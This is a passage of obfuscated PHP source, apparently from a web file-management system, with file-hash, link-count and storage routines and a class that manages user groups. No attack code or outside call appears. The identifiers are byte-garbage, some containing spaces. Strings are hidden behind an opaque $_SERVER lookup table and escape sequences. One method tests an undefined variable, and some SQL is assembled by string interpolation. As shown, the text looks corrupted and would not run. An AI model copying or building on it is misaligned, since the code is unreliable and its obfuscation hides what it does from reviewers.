$this->fileMd5Check($ë¿ãé¢•); } return $ë¿ãé¢•; } public function fileMd5Check($‘ÁàçØß) { $ İ’Ò”İ =& $_SERVER[ •ŒÓîÆ]; $¨œóê¹ = array($‘ÁàçØß[$ İ’Ò”İ[520]], $‘ÁàçØß[$ İ’Ò”İ[86]]); $„²²€ÍÎ = $ İ’Ò”İ[1953] . $‘ÁàçØß[$ İ’Ò”İ[86]]; $£Üğ²ƒ” = $ İ’Ò”İ[1954] . $‘ÁàçØß[$ İ’Ò”İ[520]]; TaskQueue::add($ İ’Ò”İ[1955], $¨œóê¹, $„²²€ÍÎ, $£Üğ²ƒ”); } public function fileMd5Set($ñ±ğ–Ÿ„, $Í‰¬æïò) { $³Ù§ü—“ =& $_SERVER[ •ŒÓîÆ]; $ï–º¸¤Ù = $this->find($ñ±ğ–Ÿ„); if (!$ï–º¸¤Ù || $ï–º¸¤Ù[$³Ù§ü—“[526]]) { return; } $ğª˜ŞÈ  = IO::hashMd5($Í‰¬æïò); if (!$ğª˜ŞÈ ) { return $³Ù§ü—“[12]; } $this->where(array($³Ù§ü—“[520] => $ñ±ğ–Ÿ„))->save(array($³Ù§ü—“[526] => $ğª˜ŞÈ )); } public function addFileMake($Ç­äåºû, $¾ŞÀÓò, $Â¡×ã«¯, $ÌĞŞ´Àõ, $Çöú¡®ñ, $ŠÈÎÇçµ) { $ø× „ûÚ =& $_SERVER[ •ŒÓîÆ]; $–¿Ü— Í = $this->createFileName($Çöú¡®ñ, $Â¡×ã«¯, $ÌĞŞ´Àõ); $×şËî¤İ = get_path_father($–¿Ü— Í); $á¢ÁÓ¨ = get_path_this($–¿Ü— Í); if ($ŠÈÎÇçµ) { $ÏÚù»Ã = IO::move($Ç­äåºû, $×şËî¤İ, !1, $á¢ÁÓ¨); } else { $ÏÚù»Ã = IO::copy($Ç­äåºû, $×şËî¤İ, !1, $á¢ÁÓ¨); } if (!$ÏÚù»Ã) { return !1; } $³ÎÔñ•§ = KodIO::defaultDriver(); $±„Œ«²È = array($ø× „ûÚ[597] => $¾ŞÀÓò, $ø× „ûÚ[1949] => 1, $ø× „ûÚ[473] => $Çöú¡®ñ, $ø× „ûÚ[849] => $³ÎÔñ•§[$ø× „ûÚ[453]], $ø× „ûÚ[474] => $–¿Ü— Í, $ø× „ûÚ[1950] => $Â¡×ã«¯, $ø× „ûÚ[1951] => $ÌĞŞ´Àõ); return $±„Œ«²È; } public function addFileCheckExist($Ÿ½´ÑÈü, $œÊŞ…£¶, $ğ¬¤‰·½) { $÷Ö“©Ÿ¬ =& $_SERVER[ •ŒÓîÆ]; $‹«èØ„Ã = $this->findByHash($Ÿ½´ÑÈü, $œÊŞ…£¶); if (!$‹«èØ„Ã) { return !1; } $ÁÎîÕ˜¾ = array($÷Ö“©Ÿ¬[1949] => intval($‹«èØ„Ã[$÷Ö“©Ÿ¬[1956]]) + 1, $÷Ö“©Ÿ¬[597] => $ğ¬¤‰·½); $this->where(array($÷Ö“©Ÿ¬[521] => $‹«èØ„Ã[$÷Ö“©Ÿ¬[520]]))->save($ÁÎîÕ˜¾); return $‹«èØ„Ã; } public function remove($üÙîóû) { $this->linkCountChange($üÙîóû, !1); $this->clearEmpty(); return !0; } public function linkAdd($†è¬³ı×) { $this->linkCountChange($†è¬³ı×, !0); } public function linkCountChange($Ë•á¾”°, $‹ÃÎ­ğí) { $•àğñİ‡ =& $_SERVER[ •ŒÓîÆ]; if (!$Ë•á¾”°) { return; } if (!is_array($Ë•á¾”°)) { $Ë•á¾”° = array($Ë•á¾”°); } $¾§şÕ”Æ = array(); foreach ($Ë•á¾”° as $Š½¯Ô) { $ØïŠ•™‡ = $Š½¯Ô . $•àğñİ‡[12]; if (!$¾§şÕ”Æ[$ØïŠ•™‡]) { $¾§şÕ”Æ[$ØïŠ•™‡] = 0; } $¾§şÕ”Æ[$ØïŠ•™‡]++; } $ŞÑ€çûï = array(); foreach ($¾§şÕ”Æ as $Š½¯Ô => $çÛ‰—×) { $ØïŠ•™‡ = $çÛ‰—× . $•àğñİ‡[12]; if (!$ŞÑ€çûï[$ØïŠ•™‡]) { $ŞÑ€çûï[$ØïŠ•™‡] = array(); } $ŞÑ€çûï[$ØïŠ•™‡][] = $Š½¯Ô; } foreach ($ŞÑ€çûï as $çÛ‰—× => $êÇÓ•û±) { if (!$êÇÓ•û±) { continue; } $çÛ‰—× = $‹ÃÎ­ğí ? $çÛ‰—× : -intval($çÛ‰—×); $ªÎ³ğÚ = array($•àğñİ‡[520] => array($•àğñİ‡[7], $êÇÓ•û±)); if ($çÛ‰—× < 0) { $ªÎ³ğÚ[$•àğñİ‡[1956]] = array($•àğñİ‡[1056], abs($çÛ‰—×)); } $this->where($ªÎ³ğÚ)->setAdd($•àğñİ‡[1956], $çÛ‰—×); } } public function findByHash($¥Ÿ¨Ş«¨, $¾”ôŒ¿É = false) { $ŒšÀĞ—ì =& $_SERVER[ •ŒÓîÆ]; if (!$¥Ÿ¨Ş«¨ && !$¾”ôŒ¿É) { return !1; } $“ß³Üìƒ = array($ŒšÀĞ—ì[1950] => $¥Ÿ¨Ş«¨); if ($¾”ôŒ¿É) { $“ß³Üìƒ = array($ŒšÀĞ—ì[1951] => $¾”ôŒ¿É); } return $this->order($ŒšÀĞ—ì[1957])->where($“ß³Üìƒ)->find(); } public function clearEmpty($Ãğ´˜® = 0) { $®‡é‘˜’ =& $_SERVER[ •ŒÓîÆ]; $”Ñµß‚Ñ = time() - 3600 * 24 * $Ãğ´˜®; $Ç…í§ƒ = $®‡é‘˜’[1958] . $”Ñµß‚Ñ; $šã¬°æÂ = $this->where($Ç…í§ƒ)->select(); if (!$šã¬°æÂ) { return; } $ââ¾Û¢Î = new Task($®‡é‘˜’[1959], $®‡é‘˜’[12], count($šã¬°æÂ)); foreach ($šã¬°æÂ as $Ê“òßŠÈ) { $ââ¾Û¢Î->update(1); $this->resetFile($Ê“òßŠÈ); } $ââ¾Û¢Î->end(); } public function resetFile($ÏĞ’ãÁ®) { $çïÄèÚ† =& $_SERVER[ •ŒÓîÆ]; $†óÊ¦¼º = array($çïÄèÚ†[521] => $ÏĞ’ãÁ®[$çïÄèÚ†[520]]); $ÍğÑ¬§Ï = Model($çïÄèÚ†[1374])->where($†óÊ¦¼º)->count(); $ãÃö¿®ç = Model($çïÄèÚ†[1960])->where($†óÊ¦¼º)->count(); $åÔÆÅû— = intval($ÍğÑ¬§Ï) + intval($ãÃö¿®ç); if ($åÔÆÅû— == 0) { IO::remove($ÏĞ’ãÁ®[$çïÄèÚ†[86]]); Model($çïÄèÚ†[1961])->delete($ÏĞ’ãÁ®[$çïÄèÚ†[520]]); $this->where($†óÊ¦¼º)->delete(); $this->metaSet($ÏĞ’ãÁ®[$çïÄèÚ†[520]], null, null); return; } if ($ÏĞ’ãÁ®[$çïÄèÚ†[1956]] != $åÔÆÅû—) { $this->where($†óÊ¦¼º)->save(array($çïÄèÚ†[1949] => $åÔÆÅû—)); } } public function storageInfo($©—¨ñàŸ = false) { $Î€„ =& $_SERVER[ •ŒÓîÆ]; $î’Ú¾ğî = $this->count() + 0.0; $¿¾ê²¨™ = 0; $†”’å¾™ = 1; $Òšˆ Ù = 0; $·é•·–ô = 5000; for ($˜¦é†›ö = 0; $˜¦é†›ö < $î’Ú¾ğî; $˜¦é†›ö = $˜¦é†›ö + $·é•·–ô) { $Œ³˜‹ = $this->limit($˜¦é†›ö, $˜¦é†›ö + $·é•·–ô)->select(); foreach ($Œ³˜‹ as $Û¨İ–) { $†”’å¾™ += $Û¨İ–[$Î€„[78]] * $Û¨İ–[$Î€„[1956]]; $¿¾ê²¨™ += $Û¨İ–[$Î€„[78]] * ($Û¨İ–[$Î€„[1956]] - 1); $Òšˆ Ù += $Û¨İ–[$Î€„[1956]]; } } $°Ç…Ê¹Ì = array($Î€„[1962] => $†”’å¾™, $Î€„[1963] => $¿¾ê²¨™, $Î€„[1964] => $¿¾ê²¨™ / $†”’å¾™, $Î€„[82] => $î’Ú¾ğî, $Î€„[1965] => $Òšˆ Ù); return $°Ç…Ê¹Ì; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\160"; protected $tableMeta = array("\164\141\142\154\x65\x4e\141\x6d\145" => "\x67\162\x6f\x75\160\137\x6d\145\164\x61", "\155\145\x74\141\x46\x69\145\x6c\144" => "\x67\x72\157\x75\x70\111\104"); protected function cacheFunctionAlias($çÄûµº) { $‚‰äÁ®³ =& $_SERVER[ •ŒÓîÆ]; return array($‚‰äÁ®³[1966] => array($çÄûµº[0], $‚‰äÁ®³[1967]), $‚‰äÁ®³[1968] => array($çÄûµº[0], $‚‰äÁ®³[1969])); } protected function getInfo($ ¨”½”, $ÃÏÓÛ = false) { $ş²æ¨­Æ = $this->getInfoSimple($ ¨”½”); if (!$ş²æ¨­Æ) { return !1; } if ($ÃÏÓÛ) { return $this->_listDataApplyItem($ş²æ¨­Æ); } return $this->cacheFunctionGet($_SERVER[ •ŒÓîÆ][1970], $ ¨”½”); } protected function getInfoSimple($†ÓïÌó, $»é¡¡Ëß = false) { $†À­ĞÂ¢ =& $_SERVER[ •ŒÓîÆ]; if ($»é¡¡Ëß) { $ÂÅô”’¹ = array($†À­ĞÂ¢[1888] => intval($†ÓïÌó)); $ƒ½¾¤öó = $this->where($ÂÅô”’¹)->find(); return is_array($ƒ½¾¤öó) ? $ƒ½¾¤öó : array(); } return $this->cacheFunctionGet($†À­ĞÂ¢[1971], $†ÓïÌó); } protected function groupAdd($¾®öî¯Ä) { $»üóİö± =& $_SERVER[ •ŒÓîÆ]; if (!$¾®öî¯Ä[$»üóİö±[182]] && isset($¾®öî¯Ä[$»üóİö±[1888]]) && $¾®öî¯Ä[$»üóİö±[1888]] == 1) { if ($î±¸Íƒ = $this->getInfoSimple($¾®öî¯Ä[$»üóİö±[1888]], !0)) { return $¾®öî¯Ä[$»üóİö±[1888]]; } } else { $î±¸Íƒ = $this->getInfoSimple($¾®öî¯Ä[$»üóİö±[182]]); if (!$î±¸Íƒ) { return !1; } } $ò­–•é¢ = $»üóİö±[575]; if ($î±¸Íƒ[$»üóİö±[565]]) { $ò­–•é¢ = $î±¸Íƒ[$»üóİö±[565]] . $î±¸Íƒ[$»üóİö±[1888]] . $»üóİö±[50]; } $‡¢Â‰§ = array($»üóİö±[473] => $this->groupNameAuto($¾®öî¯Ä[$»üóİö±[182]], $¾®öî¯Ä[$»üóİö±[32]]), $»üóİö±[456] => $¾®öî¯Ä[$»üóİö±[182]], $»üóİö±[632] => $ò­–•é¢, $»üóİö±[1972] => $¾®öî¯Ä[$»üóİö±[1875]], $»üóİö±[1973] => 0, $»üóİö±[1892] => 0); if (isset($¾®öî¯Ä[$»üóİö±[1912]])) { $‡¢Â‰§[$»üóİö±[1912]] = $¾®öî¯Ä[$»üóİö±[1912]]; } else { $ùİã¾Î¨ = $this->max($»üóİö±[1912]); if (!$ùİã¾Î¨) { $ùİã¾Î¨ = 0; } $‡¢Â‰§[$»üóİö±[1912]] = $ùİã¾Î¨ + 1; } if (!empty($¾®öî¯Ä[$»üóİö±[1888]])) { $‡¢Â‰§[$»üóİö±[1888]] = $¾®öî¯Ä[$»üóİö±[1888]]; } $İ–•éÑ = $this->add($‡¢Â‰§); $this->setNamePinyin($İ–•éÑ, $‡¢Â‰§[$»üóİö±[32]]); if (isset($¾®öî¯Ä[$»üóİö±[1974]])) { $this->metaSet($İ–•éÑ, array($»üóİö±[1974] => $¾®öî¯Ä[$»üóİö±[1974]], $»üóİö±[1975] => $¾®öî¯Ä[$»üóİö±[1975]])); unset($¾®öî¯Ä[$»üóİö±[1974]]); unset($¾®öî¯Ä[$»üóİö±[1975]]); } Model($»üóİö±[1374])->groupRootAdd($İ–•éÑ); $this->_clearCache($¾®öî¯Ä[$»üóİö±[182]]); return $İ–•éÑ; } protected function groupEdit($Á—†ôÌÓ, $¸Ò†Û«¥) { $ÙªÙáÎ =& $_SERVER[ •ŒÓîÆ]; $§¾íà–‚ = $this->getInfoSimple($Á—†ôÌÓ); if (!$§¾íà–‚) { return !1; } if (!empty($¸Ò†Û«¥[$ÙªÙáÎ[182]])) { $ìœÈóö = $this->getInfoSimple($¸Ò†Û«¥[$ÙªÙáÎ[182]]); if (!$ìœÈóö) { return !1; } if ($§¾íà–‚[$ÙªÙáÎ[1888]] == $ìœÈóö[$ÙªÙáÎ[1888]]) { return !1; } if ($¸Ò†Û«¥[$ÙªÙáÎ[182]] != $§¾íà–‚[$ÙªÙáÎ[182]]) { if ($ìœÈóö[$ÙªÙáÎ[565]] !== $§¾íà–‚[$ÙªÙáÎ[565]] && strpos($ìœÈóö[$ÙªÙáÎ[565]], $§¾íà–‚[$ÙªÙáÎ[565]] . $§¾íà–‚[$ÙªÙáÎ[1888]] . $ÙªÙáÎ[50]) === 0) { return !1; } $¸Ò†Û«¥[$ÙªÙáÎ[632]] = $ìœÈóö[$ÙªÙáÎ[565]] . $¸Ò†Û«¥[$ÙªÙáÎ[182]] . $ÙªÙáÎ[50]; $this->_changeChildLevel($§¾íà–‚, $ìœÈóö); $this->_clearCache($ìœÈóö[$ÙªÙáÎ[1888]]); $this->_clearCache($§¾íà–‚[$ÙªÙáÎ[182]]); } } if (isset($¸Ò†Û«¥[$ÙªÙáÎ[32]])) { $this->setNamePinyin($Á—†ôÌÓ, $¸Ò†Û«¥[$ÙªÙáÎ[32]]); } if (isset($¸Ò†Û«¥[$ÙªÙáÎ[1974]])) { $this->metaSet($Á—†ôÌÓ, array($ÙªÙáÎ[1974] => $¸Ò†Û«¥[$ÙªÙáÎ[1974]], $ÙªÙáÎ[1975] => $¸Ò†Û«¥[$ÙªÙáÎ[1975]])); unset($¸Ò†Û«¥[$ÙªÙáÎ[1974]]); unset($¸Ò†Û«¥[$ÙªÙáÎ[1975]]); } $this->_clearChildrenCache($§¾íà–‚); return $this->where(array($ÙªÙáÎ[1976] => $Á—†ôÌÓ))->save($¸Ò†Û«¥); } private function _clearChildrenCache($‘Ùƒ”šê) { $€¬¢• =& $_SERVER[ •ŒÓîÆ]; $ÃÆ†—Úå = array($€¬¢•[632] => array($€¬¢•[592], $‘Ùƒ”šê[$€¬¢•[565]] . $‘Ùƒ”šê[$€¬¢•[1888]] . $€¬¢•[593])); $´„½û•£ = $this->field($€¬¢•[1888])->where($ÃÆ†—Úå)->select(); foreach ($´„½û•£ as $Â¥Õ ‰í) { $this->_clearCache($Â¥Õ ‰í[$€¬¢•[1888]]); } } private function _clearCache($­êä®ÔĞ) { $‚Ëû×›œ =& $_SERVER[ •ŒÓîÆ]; $this->cacheFunctionClear($‚Ëû×›œ[1970], $­êä®ÔĞ); $this->cacheFunctionClear($‚Ëû×›œ[1971], $­êä®ÔĞ); } private function _changeChildLevel($õœÔôà±, $¶ğ´º«, $šãÕÁ´û = false) { $æÄ÷Ã›Â =& $_SERVER[ •ŒÓîÆ]; $­‚•Â·• = $õœÔôà±[$æÄ÷Ã›Â[565]] . $õœÔôà±[$æÄ÷Ã›Â[1888]] . $æÄ÷Ã›Â[50]; $µ›«ÒÚ = $¶ğ´º«[$æÄ÷Ã›Â[565]] . $¶ğ´º«[$æÄ÷Ã›Â[1888]] . $æÄ÷Ã›Â[50] . $õœÔôà±[$æÄ÷Ã›Â[1888]] . $æÄ÷Ã›Â[50]; if ($šãÕÁ´û) { $µ›«ÒÚ = $¶ğ´º«[$æÄ÷Ã›Â[565]] . $¶ğ´º«[$æÄ÷Ã›Â[1888]] . $æÄ÷Ã›Â[50]; } $ÖØğÙ« = array($æÄ÷Ã›Â[632] => array($æÄ÷Ã›Â[592], $õœÔôà±[$æÄ÷Ã›Â[565]] . $õœÔôà±[$æÄ÷Ã›Â[1888]] . $æÄ÷Ã›Â[593])); $’ğ×Ïºø = array($æÄ÷Ã›Â[632] => array($æÄ÷Ã›Â[641], "\x72\x65\160\154\141\x63\145\50\x70\141\162\145\x6e\x74\x4c\x65\166\x65\x6c\54\47{$­‚•Â·•}\x27\54\47{$µ›«ÒÚ}\x27\x29")); $this->_clearChildrenCache($õœÔôà±); $this->where($ÖØğÙ«)->data($’ğ×Ïºø)->save(); } public function setNamePinyin($ï…„•¨Ü, $ÛÖ¯¾¥ì = false) { $ìÜÚ¸Ãş =& $_SERVER[ •ŒÓîÆ]; if (!$ÛÖ¯¾¥ì) { $ñõËú»‰ = $this->getInfoSimple($ï…„•¨Ü); $ÛÖ¯¾¥ì = $ñõËú»‰[$ìÜÚ¸Ãş[32]]; } if (!Input::check($ÛÖ¯¾¥ì, $ìÜÚ¸Ãş[635])) { $this->metaSet($ï…„•¨Ü, $ìÜÚ¸Ãş[517], null); $this->metaSet($ï…„•¨Ü, $ìÜÚ¸Ãş[516], null); return; } $ïõİ¢ğš = array($ìÜÚ¸Ãş[517] => str_replace($ìÜÚ¸Ãş[53], $ìÜÚ¸Ãş[12], Pinyin::get($ÛÖ¯¾¥ì)), $ìÜÚ¸Ãş[516] => Pinyin::get($ÛÖ¯¾¥ì, $ìÜÚ¸Ãş[636])); $this->metaSet($ï…„•¨Ü, $ïõİ¢ğš); } protected function groupStatus($ÄíÆ”„¥, $ûÛàĞ•¨) { $¶È¸ôœÂ =& $_SERVER[ •ŒÓîÆ]; $íÃÒ«ú = $this->getInfoSimple($ÄíÆ”„¥); if (!$íÃÒ«ú) { return !1; } if ($ûÛàĞ•¨ == $¶È¸ôœÂ[90]) { $›Ì…Ğ‹ì = $this->parentLevelArray($íÃÒ«ú[$¶È¸ôœÂ[565]]); } else { $Áä½ßê˜ = array($¶È¸ôœÂ[632] => array($¶È¸ôœÂ[592], $íÃÒ«ú[$¶È¸ôœÂ[565]] . $íÃÒ«ú[$¶È¸ôœÂ[1888]] . $¶È¸ôœÂ[593])); $›Ì…Ğ‹ì = $this->where($Áä½ßê˜)->field($¶È¸ôœÂ[1888])->select(); $›Ì…Ğ‹ì = array_to_keyvalue($›Ì…Ğ‹ì, $¶È¸ôœÂ[12], $¶È¸ôœÂ[1888]); } $›Ì…Ğ‹ì[] = $íÃÒ«ú[$¶È¸ôœÂ[1888]]; $ƒÄçóƒ½ = array(); foreach ($›Ì…Ğ‹ì as $ÄíÆ”„¥) { $ƒÄçóƒ½[] = array($¶È¸ôœÂ[1888] => $ÄíÆ”„¥, $¶È¸ôœÂ[96] => $¶È¸ôœÂ[791], $¶È¸ôœÂ[429] => $ûÛàĞ•¨); $this->_clearCache($ÄíÆ”„¥); } return Model($¶È¸ôœÂ[1977])->addAll($ƒÄçóƒ½, array(), !0); } protected function groupRemove($€óî—¯ , $ïäì™ë = false) { $¨¸„¨Ò =& $_SERVER[ •ŒÓîÆ]; $ÚÚÛ¶Âö = array($¨¸„¨Ò[1888] => $€óî—¯ ); $®§’Ş’§ = $this->where($ÚÚÛ¶Âö)->find(); if (!$®§’Ş’§ || $®§’Ş’§[$¨¸„¨Ò[182]] == 0) { return !1; } if (!$ïäì™ë) { $ÇóÓº“É = $this->getInfoSimple($®§’Ş’§[$¨¸„¨Ò[182]]); $this->_changeChildLevel($®§’Ş’§, $ÇóÓº“É, !0); $this->where(array($¨¸„¨Ò[182] => $€óî—¯ ))->save(array($¨¸„¨Ò[182] => $®§’Ş’§[$¨¸„¨Ò[182]])); $this->_clearCache($ÇóÓº“É[$¨¸„¨Ò[1888]]); } Model($¨¸„¨Ò[1977])->where($ÚÚÛ¶Âö)->delete(); Model($¨¸„¨Ò[1978])->where($ÚÚÛ¶Âö)->delete(); Model($¨¸„¨Ò[866])->groupRootRemove($€óî—¯ ); $this->_clearCache($®§’Ş’§[$¨¸„¨Ò[182]]); return $this->where($ÚÚÛ¶Âö)->delete(); } protected function groupSort($óÄ–Šó¿) { $ÆØ—ŒÖÀ =& $_SERVER[ •ŒÓîÆ]; $ŠñÊÃõí = array(); foreach ($óÄ–Šó¿ as $„œ¡© => $À«ÚŸ™) { $ŠñÊÃõí[] = array($ÆØ—ŒÖÀ[1888], $À«ÚŸ™, $ÆØ—ŒÖÀ[1912], $„œ¡© + 1); } $this->saveAll($ŠñÊÃõí); } public function listData() { $–«÷šÂó = $this->_makeOrder()->selectPage(50); $this->_listDataApply($–«÷šÂó[$_SERVER[ •ŒÓîÆ][424]]); return $–«÷šÂó; } private function _makeOrder($ö¶Â† = '') { $‚Ì­°¨» =& $_SERVER[ •ŒÓîÆ]; $õÚÔ†â¹ = array($‚Ì­°¨»[1888], $‚Ì­°¨»[32], $‚Ì­°¨»[1877], $‚Ì­°¨»[217]); $úùÙôÒğ = array($‚Ì­°¨»[502] => $‚Ì­°¨»[503], $‚Ì­°¨»[504] => $‚Ì­°¨»[505]); $Ûæ¹ÉÕÜ = Input::get($‚Ì­°¨»[509], $‚Ì­°¨»[7], $‚Ì­°¨»[1892], $õÚÔ†â¹); $©ß§¥ù = Input::get($‚Ì­°¨»[510], $‚Ì­°¨»[7], $‚Ì­°¨»[1979], array($‚Ì­°¨»[1979], $‚Ì­°¨»[504])); $©ß§¥ù = $úùÙôÒğ[$©ß§¥ù]; $ö¶Â† = $ö¶Â† . "{$Ûæ¹ÉÕÜ}\40{$©ß§¥ù}\x2c\40\x67\162\157\x75\160\111\x44\x20\141\x73\x63"; return $this->order($ö¶Â†); } public function listChild($¦åçÁŒå) { $ãèĞ¹°£ =& $_SERVER[ •ŒÓîÆ]; $ıù”¬¤ = $this->where(array($ãèĞ¹°£[182] => $¦åçÁŒå))->_makeOrder()->selectPage(200); $this->_listDataApply($ıù”¬¤[$ãèĞ¹°£[424]]); return $ıù”¬¤; } public function listChildIds($Æ¯ûû›) { $·î¾†™Î =& $_SERVER[ •ŒÓîÆ]; if (is_string($ãš¡¢Íï)) { $Æ¯ûû› = explode($·î¾†™Î[50], $Æ¯ûû›); } $šƒÂ›ˆ‚ = $this->where(array($·î¾†™Î[1888] => array($·î¾†™Î[7], $Æ¯ûû›)))->field($·î¾†™Î[1980])->select(); if (!$šƒÂ›ˆ‚) { return !1; } $‹«†¦ãÂ = array(); foreach ($šƒÂ›ˆ‚ as $ÚÆ©È¢«) { $‹«†¦ãÂ[] = "\163\145\154\x65\x63\164\40\x67\x72\157\165\160\x49\104\x20\x66\x72\157\x6d\x20\140\x67\162\157\165\x70\x60\x20\x77\x68\145\x72\x65\x20\160\x61\162\145\156\164\x4c\145\x76\145\154\40\x6c\151\x6b\x65\x20\x27{$ÚÆ©È¢«[$·î¾†™Î[565]]}{$ÚÆ©È¢«[$·î¾†™Î[1888]]}\54\x25\47"; } $‹«†¦ãÂ = implode($·î¾†™Î[1981], $‹«†¦ãÂ); $šƒÂ›ˆ‚ = $this->query($‹«†¦ãÂ); if (!$šƒÂ›ˆ‚) { return array(); } $Æ¯ûû› = array_to_keyvalue($šƒÂ›ˆ‚, $·î¾†™Î[12], $·î¾†™Î[1888]); return array_unique($Æ¯ûû›); } public function listByID($ØÛ¥«ÏÇ) { $ë·Îïµ¿ =& $_SERVER[ •ŒÓîÆ]; if (!$ØÛ¥«ÏÇ) { return array(); } $˜¦˜ã˜Á = array($ë·Îïµ¿[1888] => array($ë·Îïµ¿[7], $ØÛ¥«ÏÇ)); $â±È»µŸ = $this->where($˜¦˜ã˜Á)->select(); $â±È»µŸ = array_sort_keep($â±È»µŸ, $ë·Îïµ¿[1888], $ØÛ¥«ÏÇ); $this->_listDataApply($â±È»µŸ); return $â±È»µŸ; } public function listSearch($ì¡œ·øÇ) { $Ä·Ô› =& $_SERVER[ •ŒÓîÆ]; $Ìñ—á¤§ = $ì¡œ·øÇ[$Ä·Ô›[1982]]; $†§”˜î© = isset($ì¡œ·øÇ[$Ä·Ô›[1983]]) ? $ì¡œ·øÇ[$Ä·Ô›[1983]] : !1; if (!trim($Ìñ—á¤§)) { return !1; } $Ìñ—á¤§ = str_replace($Ä·Ô›[1984], $Ä·Ô›[1985], $Ìñ—á¤§); $ƒ©íüí” = array($Ä·Ô›[1888] => array($Ä·Ô›[437], "{$Ìñ—á¤§}\45"), $Ä·Ô›[32] => array($Ä·Ô›[437], "\45{$Ìñ—á¤§}\45"), $Ä·Ô›[1041] => $Ä·Ô›[1986]); if ($†§”˜î©) { $¦€Ô÷À = $this->getInfoSimple($†§”˜î©); $™¬¿õ³‘ = $¦€Ô÷À[$Ä·Ô›[565]] . $†§”˜î© . $Ä·Ô›[593]; $ƒ©íüí” = array($ƒ©íüí”, array($Ä·Ô›[565] => array($Ä·Ô›[437], $™¬¿õ³‘))); } $ƒ©íüí” = $this->parseWhereLike($ƒ©íüí”); $¸ßÚ¢ÌÏ = $this->_makeOrder()->where($ƒ©íüí”)->selectPage(20); $¸ßÚ¢ÌÏ = $¸ßÚ¢ÌÏ ? $¸ßÚ¢ÌÏ : array($Ä·Ô›[424] => array(), $Ä·Ô›[421] => array()); if (!$¸ßÚ¢ÌÏ || count($¸ßÚ¢ÌÏ[$Ä·Ô›[424]]) < 5 && Input::check($Ìñ—á¤§, $Ä·Ô›[373])) { $Ï¾§ß = $this->groupChildrenAll($†§”˜î©); $©™ØÄˆü = $this->_searchFromMeta($Ä·Ô›[516], $Ìñ—á¤§, 10, $Ï¾§ß); $Åˆ¨‹ ƒ = $this->_searchFromMeta($Ä·Ô›[517], $Ìñ—á¤§, 10, $Ï¾§ß); $®´»ƒÊ = array_merge($©™ØÄˆü, $Åˆ¨‹ ƒ, $¸ßÚ¢ÌÏ[$Ä·Ô›[424]]); $¸ßÚ¢ÌÏ[$Ä·Ô›[424]] = array_unique_by_key($®´»ƒÊ, $Ä·Ô›[1888]); $¸ßÚ¢ÌÏ[$Ä·Ô›[421]][$Ä·Ô›[422]] = count($¸ßÚ¢ÌÏ[$Ä·Ô›[424]]); $¸ßÚ¢ÌÏ[$Ä·Ô›[421]][$Ä·Ô›[423]] = ceil($¸ßÚ¢ÌÏ[$Ä·Ô›[421]][$Ä·Ô›[422]] / $¸ßÚ¢ÌÏ[$Ä·Ô›[421]][$Ä·Ô›[418]]); } $this->_listDataApply($¸ßÚ¢ÌÏ[$Ä·Ô›[424]]); return $¸ßÚ¢ÌÏ; } protected function groupChildrenAll($±åÊ–ÇÎ) { $Ñ¼ÒÂÎ =& $_SERVER[ •ŒÓîÆ]; if (!$±åÊ–ÇÎ) { return !1; } if (!is_array($±åÊ–ÇÎ)) { $±åÊ–ÇÎ = array($±åÊ–ÇÎ); } $ôØ›¥ğ = $±åÊ–ÇÎ; foreach ($±åÊ–ÇÎ as $ê÷ó—„õ) { $‡ºõÑ®€ = $this->getInfoSimple($ê÷ó—„õ); $‡…•Ş¬à = array($Ñ¼ÒÂÎ[565] => array($Ñ¼ÒÂÎ[437], $‡ºõÑ®€[$Ñ¼ÒÂÎ[565]] . $ê÷ó—„õ . $Ñ¼ÒÂÎ[593])); $¥Ï¼Ñ” = $this->field($Ñ¼ÒÂÎ[1888])->where($‡…•Ş¬à)->select(); $ôØ›¥ğ = array_merge($ôØ›¥ğ, array_to_keyvalue($¥Ï¼Ñ”, $Ñ¼ÒÂÎ[12], $Ñ¼ÒÂÎ[1888])); } return array_unique($ôØ›¥ğ); } private function _searchFromMeta($ìªÒø«, $ĞÍµÏô, $û£™¿§‹, $‰Ú§ï¢) { $›Ä­¸ç• =& $_SERVER[ •ŒÓîÆ]; $ĞÍµÏô = strtolower($ĞÍµÏô); $½Óç´öÍ = array($›Ä­¸ç•[96] => $ìªÒø«, $›Ä­¸ç•[429] => array($›Ä­¸ç•[437], "\45{$ĞÍµÏô}\45")); $½Óç´öÍ = $this->parseWhereLike($½Óç´öÍ); if ($‰Ú§ï¢) { $½Óç´öÍ[$›Ä­¸ç•[1888]] = array($›Ä­¸ç•[7], $‰Ú§ï¢); } $™­Ú¨ÔÄ = Model($›Ä­¸ç•[1987])->where($½Óç´öÍ)->limit($û£™¿§‹)->select(); if (!$™­Ú¨ÔÄ) { return array(); } $™­Ú¨ÔÄ = array_to_keyvalue($™­Ú¨ÔÄ, $›Ä­¸ç•[12], $›Ä­¸ç•[1888]); $ÖÒøÎ—ğ = $this->where(array($›Ä­¸ç•[1976] => array($›Ä­¸ç•[7], $™­Ú¨ÔÄ)))->select(); if (!$ÖÒøÎ—ğ) { return array(); } return $ÖÒøÎ—ğ; } protected function _listDataApplyItem($Ÿ¤¼®—Õ) { $£ğ–Õïë = array($Ÿ¤¼®—Õ); $this->_listDataApply($£ğ–Õïë); return $£ğ–Õïë[0]; } protected function _listDataApply(&$î¥£öú) { $Ãš¡ô³° =& $_SERVER[ •ŒÓîÆ]; if (!$î¥£öú) { return; } $¹ñÂ‡÷ç = array_to_keyvalue($î¥£öú, $Ãš¡ô³°[12], $Ãš¡ô³°[1888]); $this->_listAppendChildren($î¥£öú); $this->_listAppendChildrenMember($î¥£öú); $this->_listAppendMeta($î¥£öú, $¹ñÂ‡÷ç); $this->_listAppendParent($î¥£öú); $this->_listAppendSourceRoot($î¥£öú, $¹ñÂ‡÷ç); } private function _listAppendChildren(&$¢äöÖô«) { $ª’êÈÖ¼ =& $_SERVER[ •ŒÓîÆ]; $¼×»¸ş÷ = array_to_keyvalue($¢äöÖô«, $ª’êÈÖ¼[12], $ª’êÈÖ¼[1888]); $Æ°ôè­æ = array($ª’êÈÖ¼[182] => array($ª’êÈÖ¼[7], $¼×»¸ş÷)); $æ˜¥¸å… = array($ª’êÈÖ¼[182], $ª’êÈÖ¼[1988] => $ª’êÈÖ¼[545]); $ì©‚¿§ì = $this->field($æ˜¥¸å…)->where($Æ°ôè­æ)->group($ª’êÈÖ¼[182])->select(); $¦ı€„ïÇ = array_to_keyvalue($ì©‚¿§ì, $ª’êÈÖ¼[182], $ª’êÈÖ¼[545]); foreach ($¢äöÖô« as &$¸Äœ¥) { $á“˜ºæ” = $¸Äœ¥[$ª’êÈÖ¼[1888]]; 